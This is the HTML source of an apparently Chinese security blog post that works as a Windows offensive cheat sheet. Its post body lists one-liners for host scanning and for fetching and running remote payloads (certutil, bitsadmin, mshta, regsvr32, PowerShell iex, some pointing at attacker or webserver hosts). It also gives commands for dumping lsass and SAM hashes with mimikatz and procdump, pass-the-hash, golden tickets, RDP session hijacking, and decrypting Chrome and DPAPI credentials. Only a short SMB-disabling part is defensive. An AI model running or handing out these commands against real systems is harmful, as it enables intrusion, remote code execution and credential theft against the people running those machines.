@@ -1,0 +1,949 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/blog-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/blog-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic%7CRoboto+Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"l0n9w4y.cc","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.13.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x01 扫描探测1. 存活主机1）基于arp  powershell.exe -exec bypass -Command &quot;Import-Module .\arpscan.ps1;Invoke-ARPScan -CIDR 192.168.1.0&#x2F;24&quot;  arp-scan.exe -t 192.168.1.1&#x2F;24  arp-ping.exe 192.16">
+<meta property="og:type" content="article">
+<meta property="og:title" content="L0n9w4y">
+<meta property="og:url" content="https://l0n9w4y.cc/posts/0/index.html">
+<meta property="og:site_name" content="L0n9w4y">
+<meta property="og:description" content="0x01 扫描探测1. 存活主机1）基于arp  powershell.exe -exec bypass -Command &quot;Import-Module .\arpscan.ps1;Invoke-ARPScan -CIDR 192.168.1.0&#x2F;24&quot;  arp-scan.exe -t 192.168.1.1&#x2F;24  arp-ping.exe 192.16">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-10-22T05:39:51.933Z">
+<meta property="article:modified_time" content="2022-10-22T05:39:51.936Z">
+<meta property="article:author" content="L0n9w4y">
+<meta property="article:tag" content="入侵对抗、威胁检测、溯源响应">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://l0n9w4y.cc/posts/0/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l0n9w4y.cc/posts/0/","path":"posts/0/","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title> | L0n9w4y</title>
+  
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">L0n9w4y</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-攻防"><a href="/security/" rel="section"><i class="fa fa-navicon fa-fw"></i>攻防</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B"><span class="nav-text">0x01 扫描探测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="nav-text">1. 存活主机</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%8A%95%E9%80%92%E6%89%A7%E8%A1%8C"><span class="nav-text">0x02 投递执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96"><span class="nav-text">0x03 凭证获取</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-hash%E5%AF%BC%E5%87%BA"><span class="nav-text">1. hash导出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-lsass-Dump"><span class="nav-text">2. lsass Dump</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Mimikatz"><span class="nav-text">3. Mimikatz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-DPAPI"><span class="nav-text">4. DPAPI</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%87%AD%E6%8D%AE%E4%BD%BF%E7%94%A8"><span class="nav-text">0x04 凭据使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%88%9B%E5%BB%BA%E5%87%AD%E6%8D%AE"><span class="nav-text">1. 创建凭据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%87%AD%E6%8D%AE%E5%88%A9%E7%94%A8"><span class="nav-text">2. 凭据利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">0x05 权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. 基础信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%AF%86%E7%A0%81%E6%9F%A5%E6%89%BE"><span class="nav-text">2. 密码查找</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E8%BF%9B%E7%A8%8B-x2F-%E6%9C%8D%E5%8A%A1%E6%9E%9A%E4%B8%BE"><span class="nav-text">3. 进程&#x2F;服务枚举</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="L0n9w4y"
+      src="/images/hexo.png">
+  <p class="site-author-name" itemprop="name">L0n9w4y</p>
+  <div class="site-description" itemprop="description">攻防对抗，問道遠兮，求索未止...</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">34</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">34</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/L0n9w4y" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;L0n9w4y" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/l0n9w4y" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;l0n9w4y" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/_L0n9_" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;_L0n9_" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://l0n9w4y.cc/posts/0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/hexo.png">
+      <meta itemprop="name" content="L0n9w4y">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L0n9w4y">
+      <meta itemprop="description" content="攻防对抗，問道遠兮，求索未止...">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | L0n9w4y">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-10-22 13:39:51" itemprop="dateCreated datePublished" datetime="2022-10-22T13:39:51+08:00">2022-10-22</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="0x01-扫描探测"><a href="#0x01-扫描探测" class="headerlink" title="0x01 扫描探测"></a>0x01 扫描探测</h2><h3 id="1-存活主机"><a href="#1-存活主机" class="headerlink" title="1. 存活主机"></a>1. 存活主机</h3><pre class="language-none"><code class="language-none">1）基于arp
+
+powershell.exe -exec bypass -Command &quot;Import-Module .\arpscan.ps1;Invoke-ARPScan -CIDR 192.168.1.0&#x2F;24&quot;
+
+arp-scan.exe -t 192.168.1.1&#x2F;24
+
+arp-ping.exe 192.168.1.100
+
+2) 基于netbios
+
+nbtstat -n
+
+nbtscan-1.0.35.exe -m 192.168.1.0&#x2F;24
+
+3) 基于ICMP
+
+powershell.exe ‐exec bypass ‐Command &quot;Import‐Module .&#x2F;Invoke‐TSPingSweep.ps1; Invoke‐TSPingSweep ‐StartAddress 192.168.1.1 ‐EndAddress 192.168.1.254 ‐ResolveHost ‐ScanPort ‐Port 445,135&quot;
+
+tcping.exe ‐n 1 192.168.1.0 80
+
+4）基于SMB
+
+445 | %&#123; echo ((new‐object Net.Sockets.TcpClient).Connect(&quot;192.168.1.119&quot;,$_)) &quot;$_ is open&quot;&#125; 2&gt;$null
+
+1..5 | % &#123; $a &#x3D; $_; 445 | % &#123;echo ((new‐object Net.Sockets.TcpClient).Connect(&quot;192.168.1.$a&quot;,$_)) &quot;Port $_ is open&quot;&#125; 2&gt;$null&#125;
+
+118..119 | % &#123; $a &#x3D; $_; write‐host &quot;‐‐‐‐‐‐&quot;; write‐host &quot;192.168.1.$a&quot;; 80,445 | % &#123;echo ((new‐object Net.Sockets.TcpClient).Connect(&quot;192.168.1.$a&quot;,$_)) &quot;Port $_ is open&quot;&#125; 2&gt;$null&#125;
+
+5）基于SqlDataSourceEnumerator
+
+PowerShell -Command &quot;[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()&quot;</code></pre>
+
+<h2 id="0x02-投递执行"><a href="#0x02-投递执行" class="headerlink" title="0x02 投递执行"></a>0x02 投递执行</h2><pre class="language-none"><code class="language-none">1) vbs一句话下载payload
+
+cscript downfile.vbs http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt C:\Inetpub\b.txt
+
+cscript &#x2F;&#x2F;E:jscript \\webdavserver\folder\payload.txt
+
+echo set a&#x3D;createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w&#x3D;createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open^&quot;get^&quot;,wsh.arguments(0),0:w.send:a.type&#x3D;1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt;downfile.vbs
+
+2) certutil一句话下载payload
+
+certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt
+
+certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt delete  # 清除缓存
+
+certutil -encode c:\downfile.vbs downfile.bat
+
+certutil -decode downfile.bat c:\downfile.vbs
+
+powershell.exe ‐Win hiddeN ‐Exec ByPasS add‐content ‐path %APPDATA%\\cer.cer (New‐Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.1.5&#x2F;cer.cer&#39;); certutil ‐decode %APPDATA%\cer.cer %APPDATA%\stage.ps1 &amp; start &#x2F;b cmd &#x2F;c powershell.exe ‐Exec Bypass ‐NoExit ‐File %APPDATA%\stage.ps1 &amp; start &#x2F;b cmd &#x2F;c del %APPDATA%\cer.cer  # powershell内存加载 + certuil投递
+
+certutil -urlcache -split -f http:&#x2F;&#x2F;webserver&#x2F;payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.dll &amp; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil &#x2F;logfile&#x3D; &#x2F;LogToConsole&#x3D;false &#x2F;u payload.dll
+
+certutil -urlcache -split -f http:&#x2F;&#x2F;webserver&#x2F;payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.exe &amp; payload.exe
+
+3) ftp一句话下载payload
+
+echo open 192.168.1.115 21&gt; ftp.txt
+echo 123&gt;&gt; ftp.txt &#x2F;&#x2F;user
+echo 123&gt;&gt; ftp.txt &#x2F;&#x2F;password
+echo binary &gt;&gt; ftp.txt &#x2F;&#x2F;bin模式
+echo get robots.txt &gt;&gt; ftp.txt
+echo bye &gt;&gt; ftp.txt
+
+echo open 127.0.0.1 &gt; o&amp;echo user 123 123 &gt;&gt; o &amp;echo get bin_tcp_x86_53.exe &gt;&gt; o &amp;echo quit &gt;&gt; o &amp;ftp ‐n ‐s:o &amp;del &#x2F;F &#x2F;Q o
+
+echo open 127.0.0.1 &gt; o&amp;echo get bin_tcp_x86_53.exe &gt;&gt; o &amp;echo quit &gt;&gt; o &amp;ftp ‐A ‐n ‐s:o &amp;del &#x2F;F &#x2F;Q o
+
+4) bitsadmin一句话下载payload
+
+bitsadmin &#x2F;rawreturn &#x2F;transfer down &quot;http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt&quot; E:\PDF\robots.txt
+
+bitsadmin &#x2F;transfer down &#x2F;download &#x2F;priority normal &quot;http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt&quot; E:\PDF\robots.txt  # 查看进度
+
+bitsadmin &#x2F;setpriority down foreground  # 下载过大的文件时提高优先级
+
+bitsadmin &#x2F;transfer mydownloadjob &#x2F;download &#x2F;priority normal http:&#x2F;&#x2F;&lt;attackerIP&gt;&#x2F;xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe
+
+5）js一句话下载payload
+
+cscript &#x2F;nologo downfile.js http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt  # 读取
+
+    var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);
+    WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), &#x2F;*async&#x3D;*&#x2F;false);
+    WinHttpReq.Send();
+    WScript.Echo(WinHttpReq.ResponseText);
+
+cscript &#x2F;nologo dowfile2.js http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt  # 写入
+
+    var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);
+    WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), &#x2F;*async&#x3D;*&#x2F;false);
+    WinHttpReq.Send();
+
+    BinStream &#x3D; new ActiveXObject(&quot;ADODB.Stream&quot;); BinStream.Type &#x3D; 1;
+
+    BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody);
+    BinStream.SaveToFile(&quot;down.exe&quot;);
+
+6）powershell一句话下载payload
+
+down.ps1
+
+    $Urls &#x3D; @()
+    $Urls +&#x3D; &quot;http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt&quot;
+    $OutPath &#x3D; &quot;E:\PDF\&quot; 
+    ForEach ( $item in $Urls) &#123;
+    $file &#x3D; $OutPath + ($item).split(&#39;&#x2F;&#39;)[-1]
+    (New-Object System.Net.WebClient).DownloadFile($item, $file) 
+    &#125;
+
+powershell C:\inetpub\down.ps1  # 需要绝对路径
+
+powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt&#39;,&#39;E:\robots.txt&#39;)
+
+powershell -exec bypass -c &quot;(New-Object Net.WebClient).Proxy.Credentials&#x3D;[Net.CredentialCache]::DefaultNetworkCredentials;iwr(&#39;http:&#x2F;&#x2F;webserver&#x2F;payload.ps1&#39;)|iex&quot;  # 基于HTTP下载执行
+
+powershell -exec bypass -f \\webdavserver\folder\payload.ps1  # 基于Webdav Server
+
+7) cmd
+
+cmd.exe &#x2F;k &lt; \\webdavserver\folder\batchfile.txt
+
+8) Mshta
+
+mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http:&#x2F;&#x2F;webserver&#x2F;payload.sct&quot;&quot;)&quot;))
+
+mshta http:&#x2F;&#x2F;webserver&#x2F;payload.hta
+
+mshta \\webdavserver\folder\payload.hta
+
+9）Rundll32
+rundll32 \\webdavserver\folder\payload.dll,entrypoint
+rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;o&#x3D;GetObject(&quot;script:http:&#x2F;&#x2F;webserver&#x2F;payload.sct&quot;);window.close();
+
+10）Regasm &#x2F; Regsvc @subTee
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe &#x2F;u \\webdavserver\folder\payload.dll
+
+11）Regsvr32 @subTee
+
+regsvr32 &#x2F;u &#x2F;n &#x2F;s &#x2F;i:http:&#x2F;&#x2F;webserver&#x2F;payload.sct scrobj.dll
+regsvr32 &#x2F;u &#x2F;n &#x2F;s &#x2F;i:\\webdavserver\folder\payload.sct scrobj.dll
+
+12）Odbcconf
+odbcconf &#x2F;s &#x2F;a &#123;regsvr \\webdavserver\folder\payload_dll.txt&#125;
+
+13）Msbuild
+cmd &#x2F;V &#x2F;c &quot;set MB&#x3D;&quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe&quot; &amp; !MB! &#x2F;noautoresponse &#x2F;preprocess \\webdavserver\folder\payload.xml &gt; payload.xml &amp; !MB! payload.xml&quot;
+</code></pre>
+
+<p><strong>SMB检测与禁用</strong></p>
+<pre class="language-none"><code class="language-none">1）检测
+
+Get-SmbServerConfiguration | Select EnableSMB1Protocol  # SMBv1
+
+Get-SmbServerConfiguration | Select EnableSMB2Protocol  # SMB v2&#x2F;v3
+
+2）禁用
+
+Set-SmbServerConfiguration -EnableSMB1Protocol $false  # SMBv1
+
+Set-SmbServerConfiguration -EnableSMB2Protocol $false  # SMB v2&#x2F;v3
+
+3）启用
+
+Set-SmbServerConfiguration -EnableSMB1Protocol $true  # SMBv1
+
+Set-SmbServerConfiguration -EnableSMB2Protocol $true  # SMB v2&#x2F;v3
+
+4）445端口启停
+
+REG ADD HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters &#x2F;v SMBDeviceEnabled &#x2F;T REG_DWORD &#x2F;D 0 &#x2F;F &amp;&amp; sc config LanmanServer start&#x3D; disabled &amp;&amp; net stop lanmanserver &#x2F;y   # 32位
+
+REG ADD HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters &#x2F;v SMBDeviceEnabled &#x2F;T REG_QWORD &#x2F;D 0 &#x2F;F &amp;&amp; sc config LanmanServer start&#x3D; disabled &amp;&amp; net stop lanmanserver &#x2F;y   # 64位
+
+reg delete HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters &#x2F;v SMBDeviceEnabled &#x2F;f  # 启动复原
+
+sc.exe config LanmanServer start&#x3D; auto
+
+sc.exe start LanmanServer</code></pre>
+
+<h2 id="0x03-凭证获取"><a href="#0x03-凭证获取" class="headerlink" title="0x03 凭证获取"></a>0x03 凭证获取</h2><h3 id="1-hash导出"><a href="#1-hash导出" class="headerlink" title="1. hash导出"></a>1. hash导出</h3><pre class="language-none"><code class="language-none">1) reg save 方式
+
+reg save HKLM\SYSTEM sys.hiv  
+reg save HKLM\SAM sam.hiv  
+reg save hklm\security security.hiv
+
+2) mimikatz
+
+mimikatz.exe &quot;lsadump::sam &#x2F;system:sys.hiv &#x2F;sam:sam.hiv&quot; exit  # 离线导hash
+
+mimikatz.exe &quot;log credit.txt&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;  # 在线导hash</code></pre>
+
+<h3 id="2-lsass-Dump"><a href="#2-lsass-Dump" class="headerlink" title="2. lsass Dump"></a>2. lsass Dump</h3><pre class="language-none"><code class="language-none">1）procdump
+
+# HTTP method - using the default way
+certutil -urlcache -split -f http:&#x2F;&#x2F;live.sysinternals.com&#x2F;procdump.exe C:\Users\Public\procdump.exe
+C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+# SMB method - using the pid
+net use Z: https:&#x2F;&#x2F;live.sysinternals.com
+tasklist &#x2F;fi &quot;imagename eq lsass.exe&quot; # Find lsass&#39;s pid
+Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp
+
+2）rundll32
+
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.dmp full
+
+3）Mimikatz
+
+mimikatz # sekurlsa::minidump lsass.dmp
+Switch to minidump
+mimikatz # sekurlsa::logonPasswords</code></pre>
+
+<h3 id="3-Mimikatz"><a href="#3-Mimikatz" class="headerlink" title="3. Mimikatz"></a>3. Mimikatz</h3><pre class="language-none"><code class="language-none">1）Execute commands
+
+PS C:\temp\mimikatz&gt; .\mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit # 单行
+
+PS C:\temp\mimikatz&gt; .\mimikatz  # 多行
+mimikatz # privilege::debug
+mimikatz # log
+mimikatz # sekurlsa::logonpasswords
+mimikatz # sekurlsa::wdigest
+
+2）Extract passwords
+
+mimikatz_command -f sekurlsa::logonPasswords full
+mimikatz_command -f sekurlsa::wdigest
+
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;f &#x2F;d 1
+
+3）Pass The Hash
+
+mimikatz # sekurlsa::pth &#x2F;user:SCCM$ &#x2F;domain:IDENTITY &#x2F;ntlm:e722dfcd077a2b0bbe154a1b42872f4e &#x2F;run:powershell
+
+4）Golden ticket
+
+.\mimikatz kerberos::golden &#x2F;admin:ADMINACCOUNTNAME &#x2F;domain:DOMAINFQDN &#x2F;id:ACCOUNTRID &#x2F;sid:DOMAINSID &#x2F;krbtgt:KRBTGTPASSWORDHASH &#x2F;ptt
+
+.\mimikatz &quot;kerberos::golden &#x2F;admin:DarthVader &#x2F;domain:rd.lab.adsecurity.org &#x2F;id:9999 &#x2F;sid:S-1-5-21-135380161-102191138-581311202 &#x2F;krbtgt:13026055d01f235d67634e109da03321 &#x2F;startoffset:0 &#x2F;endin:600 &#x2F;renewmax:10080 &#x2F;ptt&quot; exit
+
+5）Skeleton key
+
+# map the share
+net use p: \\WIN-PTELU2U07KG\admin$ &#x2F;user:john mimikatz
+# login as someone
+rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
+
+6）RDP session takeover
+
+# get the Session ID you want to hijack
+query user
+create sesshijack binpath&#x3D; &quot;cmd.exe &#x2F;k tscon 1 &#x2F;dest:rdp-tcp#55&quot;
+net start sesshijack
+
+7）Chrome Cookies &amp; Credential
+
+# Saved Cookies
+dpapi::chrome &#x2F;in:&quot;%localappdata%\Google\Chrome\User Data\Default\Cookies&quot; &#x2F;unprotect
+dpapi::chrome &#x2F;in:&quot;C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\Cookies&quot; &#x2F;masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b
+
+# Saved Credential in Chrome
+dpapi::chrome &#x2F;in:&quot;%localappdata%\Google\Chrome\User Data\Default\Login Data&quot; &#x2F;unprotect</code></pre>
+
+<h3 id="4-DPAPI"><a href="#4-DPAPI" class="headerlink" title="4. DPAPI"></a>4. DPAPI</h3><pre class="language-none"><code class="language-none">1) 显示凭据
+
+vaultcmd &#x2F;list
+
+VaultCmd &#x2F;listcreds:&lt;namevault&gt;|&lt;guidvault&gt; &#x2F;all
+vaultcmd &#x2F;listcreds:&quot;Windows Credentials&quot; &#x2F;all
+
+2）列出凭据文件
+
+dir &#x2F;a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
+dir &#x2F;a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+
+Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
+Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+
+3）Mimikatz - Credential Manager &amp; DPAPI
+
+# check the folder to find credentials
+dir C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\*
+
+# check the file with mimikatz
+mimikatz dpapi::cred &#x2F;in:C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
+
+# find master key
+mimikatz !sekurlsa::dpapi
+
+# use master key
+mimikatz dpapi::cred &#x2F;in:C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 &#x2F;masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
+
+# find and export backup keys
+lsadump::backupkeys &#x2F;system:dc01.lab.local &#x2F;export
+
+# use backup keys
+dpapi::masterkey &#x2F;in:&quot;C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe&quot; &#x2F;pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
+
+4）DonAPI - 远程转储
+
+DonPAPI.py domain&#x2F;user:passw0rd@target
+DonPAPI.py --hashes &lt;LM&gt;:&lt;NT&gt; domain&#x2F;user@target
+
+# using domain backup key
+dpapi.py backupkeys --export -t domain&#x2F;user:passw0rd@target_dc_ip
